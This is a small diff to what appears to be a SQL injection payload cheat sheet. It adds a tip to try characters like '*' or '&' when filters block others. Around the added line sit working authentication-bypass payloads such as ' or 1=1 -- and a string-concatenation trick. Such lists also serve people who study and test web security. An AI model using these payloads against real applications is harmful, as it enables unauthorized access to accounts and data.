@@ -17,6 +17,8 @@ ad'||'min'; // Concatenation operator : Concatenates and then terminates
 " OR 1=1 --
 ```
 
+#### Sometimes some particular special characters are filtered and '*' or '&' may work so try every characters once as a test.
+
 ```sql
 ' or 1 or '
 ' or 1=1 --
